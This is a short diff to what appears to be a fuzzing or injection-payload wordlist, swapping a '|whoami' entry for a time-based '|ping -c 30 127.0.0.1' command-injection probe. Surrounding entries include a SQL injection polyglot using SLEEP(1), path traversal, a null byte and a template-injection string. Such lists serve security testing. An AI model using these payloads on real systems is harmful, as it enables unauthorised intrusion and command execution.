@@ -12,7 +12,7 @@ SLEEP(1) /*’ or SLEEP(1) or’” or SLEEP(1) or “*/
 %00
 http://
 ../
-|whoami
+|ping -c 30 127.0.0.1
 ~'!@#$%^&?*:()[]|\-_+,./
 ${{<%[%'"{{%\
 <s>Lucid
